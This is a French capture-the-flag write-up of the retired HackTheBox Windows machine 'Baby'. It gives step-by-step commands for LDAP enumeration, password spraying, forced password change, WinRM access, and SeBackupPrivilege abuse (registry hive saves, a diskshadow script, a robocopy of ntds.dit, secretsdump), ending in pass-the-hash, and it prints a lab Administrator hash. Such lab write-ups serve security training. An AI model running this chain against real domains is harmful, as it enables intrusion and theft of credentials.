---
title: "HTB Write-up - Baby"
date: 2026-05-01
categories: [Offensive, HTB_Machines]
tags: [htb, windows, easy, retired, active-directory]
image:
  path: /assets/img/htb/baby/card_htb_baby.png
---

## Contexte
> - Nom: Baby
> - Type: Windows
> - Niveau: Easy

La box `Baby` est une box Windows issue de la collaboration entre `Vulnlab` et `HackTheBox`. C'est une bonne entrée en matière lorsque nous souhaitons aborder le monde du CTF et des challenges !


## Enumeration
Nous allons commencer par énumérer les différents ports ouverts sur notre cible à l'aide de `nmap`

**scan nmap**
```bash
nmap -p- -sS -sV --open 10.129.234.71
```

- -p- : pour lister tous les ports TCP
- -sS : pour réaliser un scan SYN (plus rapide)
- -sV : pour lister la version des services
- --open : pour lister uniquement les ports ouverts


![Résultat du scan nmap](/assets/img/htb/baby/nmap_scan.png)
_Résultat du scan nmap_


Grâce à ce résultat, nous pouvons déceler quelques pistes de compromission envisageables.

Par exemple :
- 445 - SMB: accès à des partages réseaux sans authentification
- 88 - Kerberos: possibilité d'énumérer les utilisateurs
- 389 - LDAP: énumération des utilisateurs par LDAP
- 139/135 - netbios et msrpc

Nous découvrons par la même occasion qu'il s'agit du contrôleur de domaine du domaine `baby.vl`. Nous allons donc axer nos attaques sur les vecteurs Active Directory.

### Partage SMB
Avant d'aller plus loin, nous allons tenter de nous connecter de manière anonyme aux partages SMB. Si cela se produit, nous pourrons sans doutes acceder à des informations pertinentes qui nous permettront d'aller plus loin.

**smbclient**
```bash
smbclient -N -L //10.129.234.71/
```

Malheureusement pour nous, aucun partage de disponible.

![Résultat de smbclient en anonyme](/assets/img/htb/baby/smbclient_anon_list.png)
_Résultat de smbclient en anonyme_

Nous allons donc passer sur un autre service.

### LDAP
`LDAP` est un protocole utilisé pour accéder et gérer des annuaires d'information. Typiquement il peut stocker et interroger :
- des utilisateurs
- des groupes 
- des machines
- etc ..

Nous allons donc vérifier si nous pouvons interagir avec `LDAP` sans authentification afin de lister les utilisateurs du domaine, leurs descriptions, ainsi que d'autres informations pouvant être pertinentes dans notre énumération.

Nous allons utiliser `netexec` pour réaliser cette tâche.

**énumération des utilisateurs ldap via netexec**
```bash
nxc ldap 10.129.234.71 --users
```

Et... c'est une très bonne nouvelle ! Nous avons :
- Une interaction sans authentification avec le service 
- Une liste d'utilisateurs
- Un mot de passe stocké dans le champs `description` de l'utilisateur

![Liste d'utilisateur LDAP via netexec](/assets/img/htb/baby/nxc_anon_ldap_users.png)
_Liste d'utilisateurs LDAP via netexec_

Le mot de passe à l'air d'être un mot de passe défini par défaut pour les utilisateurs du domaine.

Nous allons essayer de voir si le compte est valide avec ces identifiants.
```bash
nxc ldap 10.129.234.71 -u 'Teresa.Bell' -p 'BabyStart123!'
```

Mot de passe incorrect.


## Exploitation

### Password spraying
Vu que le mot de passe n'est pas valide pour `Teresa.Bell`, peut être le sera-t-il pour les autres utilisateurs ? Nous allons le savoir en testant ce mot de passe sur les utilisateurs suivants :

**users.txt**
```plaintext
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```

Nous allons tester cette hypothèse avec netexec en ciblant les utilisateurs présents dans `users.txt` et avec `BabyStart123!` en mot de passe.

**Password spraying users.txt**
```bash
nxc ldap 10.129.234.71 -u users.txt -p 'BabyStart123!'
```

Et c'est un échec, aucun couple d'identifiant/mot de passe valide.

![Password spraying users.txt](/assets/img/htb/baby/nxc_password_spray_1.png)
_Password spraying users.txt_

Bon, nous allons voir si d'autres utilisateurs sont présents sur notre annuaire LDAP, en explorant tous les objets de l'annuaire.

**Liste de tous les objets LDAP**
```bash
nxc ldap 10.129.234.71 --query "(objectClass=*)" ""
```

Et effectivement, c'est le cas !
![Liste de tous les objets LDAP](/assets/img/htb/baby/list_all_ldap_objects.png) 
_Liste de tous les objets LDAP_

Nous découvrons des utilisateurs présents dans l'OU `dev` qui ne figurent pas dans notre liste initiale !

Les noms supplémentaires sont `Ian.Walker` et `Caroline.Robinson`. Si nous ajoutons leurs noms à notre liste et essayons

Nous allons donc ajouter ces utilisateurs à `users.txt` et re-tenter un password spraying.

**Password spraying users.txt**
```bash
nxc ldap 10.129.234.71 -u users.txt -p 'BabyStart123!'
```

Nous avons un résultat intéressant pour `Caroline.Robinson` !

![Password spraying users.txt](/assets/img/htb/baby/nxc_password_spray_2.png)
_Password spraying users.txt_


Nous pouvons voir que l'utilisateur `caroline.robinson` possède le message suivant :
- `STATUS_PASSWORD_MUST_CHANGE`

`STATUS_PASSWORD_MUST_CHANGE` est un message d'état (souvent un code d'erreur Windows ou Active Directory), qui signifie que le mot de passe du compte doit être changé immédiatement.

Nous allons donc changer son mot de passe avec `changepasswd.py` de la suite `impacket`.

**changement du mot de passe avec changepasswd.py**
```bash
changepasswd.py -newpass 'Dsgsec123!' "BABY"/"Caroline.Robinson"@"10.129.234.71"
```

Voilà notre nouveau mot de passe actualisé pour `caroline.robinson` !
![Changement du mot de passe caroline.robinson](/assets/img/htb/baby/change_caroline_password.png)
_Changement du mot de passe caroline.robinson_

Désormais tentons de nous connecter au serveur via `winrm`

**connexion par winrm**
```bash
evil-winrm-py --ip "10.129.234.71" --user "Caroline.Robinson" -p 'Dsgsec123!'
```

Success ! Nous sommes bien sur la machine et nous pouvons même récupérer notre flag `utilisateur` ! 

![Récupération du flag utilisateur](/assets/img/htb/baby/user_flag.png)
_Récupération du flag utilisateur_


Désormais il ne reste plus qu'à élever nos privileges !


## Privilege Escalation
Comme tout début d'élévation de privilèges, nous devons nous poser la question de :
- Qui je suis ?
- Où je suis ?
- Je peux faire quoi ?

Et bien répondons aux questions `Qui je suis ?` et `Je peux faire quoi ?` grâce à la commande `whoami /priv` pour lister nos privilges sur le serveur !

**énumeration des privileges**
```powershell
whoami /priv
```

Et nous pouvons voir que nous avons notre vecteur d'élevation !

![Résultat de whoami /priv](/assets/img/htb/baby/whoami_priv.png)
_Résultat de whoami /priv_

Les privileges :
- SeBackupPrivilege
- SeRestorePrivilege

sont la clé de notre succès, car ils peuvent nous permettre de sauvegarder et de restaurer n’importe quel fichier sur notre machine.

L'idée est de pouvoir `sauvegarder` et `restaurer` les bases `SAM` et `ntds.dit` qui sont les bases de données local et Active Directory. En les récupérant, nous pouvons y extraire les utilisateur ainsi que leurs hash `NT`. Ce qui va nous permettre de nous authentifier avec n'importe quel utilisateur sur le domaine. 

Vous l'aurez compris le but est de récupérer le hash `NT` de l'utilisateur `Administrateur`.

### Exploitation de SeBackupPrivilege

Nous allons commencer par sauvegarder la base `sam` dans `C:\Users\Caroline.Robinson\Desktop`

**Sauvegarde SAM**
```powershell
reg save hklm\sam C:\Users\Caroline.Robinson\Desktop\sam.hive
```

De même avec `SYSTEM` qui va nous permettre de déchiffrer `SAM`, sans `SYSTEM`, la base `SAM` ne nous sera pas accessible.

**Sauvegarde SAM**
```powershell
reg save hklm\system C:\Users\Caroline.Robinson\Desktop\system.hive
```

![Sauvegarde de SAM et SYSTEM](/assets/img/htb/baby/save_hive.png)
_Sauvegarde de SAM et SYSTEM_

Maintenant nous allons extraire `sam.hive` et `system.hive` du serveur, pour les récupérer sur notre machine attaquante via la commande `download` de `Evil-Winrm`.

![Téléchargement de SAM et SYSTEM](/assets/img/htb/baby/download_hive.png)
_Téléchargement de SAM et SYSTEM_

### Récupération des hash NT
Il ne nous reste plus qu'à extraire les hash `NT` de `SAM` grâce à `secretdump.py`

**extractation des hash**
```bash
secretsdump -sam sam.hive -system system.hive LOCAL
```

![Extraction des hash avec Secretdump](/assets/img/htb/baby/extract_hash.png)
_Extraction des hash avec Secretdump_


Nous voilà désormais en possession du hash de l'utilisateur `Administrator`
```plaintext
Administrator:8d992faed38128ae85e95fa35868bb43
```

### Pass-The-Hash Administrator - local
Il ne reste plus qu'à nous connecter à la machine en tant qu'administrateur via une attaque `Pass-The-Hash` ! 

> Le Pass-the-Hash (PtH) est une technique d'authentification utilisée dans les environnements Windows où un attaquant exploite directement le hash NT d'un mot de passe, sans jamais connaître le mot de passe en clair. Comme certains protocoles d’authentification acceptent ce hash comme preuve d'identité, il devient possible d'accéder à des machines ou des services en se faisant passer pour un utilisateur légitime.

****

Aïe... ça ne passe pas.

![Pass-The-Hash admin local](/assets/img/htb/baby/pth_admin_local.png)
_Pass-The-Hash admin local_

On dirait que nous n'avons pas la permission de nous connecter avec le compte administrateur `local`.

Pas de panique, si il existe un administrateur `local`, il est existe aussi un administrateur sur le `domaine` ! 

Si la base `SAM` contient les données d'authentification de utilisateurs `locaux`, nous allons extraire les hashes des utilisateurs du domaine qui se situe dans la base `ntds.dit` !


### Récupération de ntds.dit
Là où `SAM` peut être récupéré via un dump de registre, `ntds.dit` ne peut pas être atteint de cette manière.

Nous allons réaliser une copie du disque `C:` grâce à notre fameux `SeBackupPrivilege` ! Une fois le disque copié, nous aurons accès à tout son contenu, donc nous récupérerons `ntds.dit` à ce moment-là !

Pour cela nous allons d'abord créer le fichier `raj.dsh`
```bash
nano raj.dsh
```

Et y insérer le contenu suivant :
```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

Et le convertir en format `dos` avec cette commande
```bash
unix2dos raj.dsh
```

![unix2dos](/assets/img/htb/baby/unix2dos.png)
_Unix2dos de raj.dsh_


maintenant connectons nous à nouveau sur le serveur par `Winrm`, et nous allons créer un dossier `temp` à la racine de `C:`

```powershell
cd /
mkdir temp
cd temp
```

![Création de /temp](/assets/img/htb/baby/temp.png)
_Création de /temp_

Désormais uploadons `raj.dsh` dans `C:\temp`

**upload de raj.dsh**
```powershell
upload raj.dsh .
```

Et executons `raj.dsh` avec `Diskshadow` ! 

**Lancement de raj.dsh avec Diskshadow**
```powershell
diskshadow /s raj.dsh
```

> Cette suite de commandes sert à créer une copie instantanée du disque C: et à la monter pour y accéder comme un disque normal. C’est souvent utilisé pour : 
> - sauvegarde
> - récupération de fichiers verrouillés
> - analyse système (ou forensic)

![Execution de Diskshadow](/assets/img/htb/baby/diskshadow.png)
_Execution de Diskshadow_


Maintenant nous allons utiliser `robocopy` qui nous permet de copier des fichiers depuis une snapshot (que nous venons de créer via `diskshadow`), et nous permettre de récupérer `ntds.dit`

**copie de ntds.dit**
```powershell
robocopy /b z:\windows\ntds . ntds.dit
```

![Copie de ntds.dit](/assets/img/htb/baby/copy_ntds.png)
_Copie de ntds.dit_


### Dump de ntds.dit

Et maintenant nous avons bien `ntds.dit` et il nous suffit de le déposer sur notre machine avec la commande `download` 

![Download ntds.dit](/assets/img/htb/baby/download_ntds.png)
_Download ntds.dit_


Et y extraire les secrets avec `secretdump` comme nous l'avons fait avec la base `SAM` ! 


> Si secretdump ne fonctionne pas, vous pouvez utiliser gosecretsdump

**dump de ntds.dit**
```bash
gosecretsdump -ntds ntds.dit -system system.hive
```

![Dump ntds](/assets/img/htb/baby/dump_ntds.png)
_Dump ntds.dit_

#### Pass-The-Hash - Administrateur du domaine
Il ne reste plus qu'à nous connecter à la machine en tant qu'administrateur du domaine via une attaque `Pass-The-Hash` et récupérer le flag `root` ! 

![Root flah](/assets/img/htb/baby/root.png)
_Rooted !_


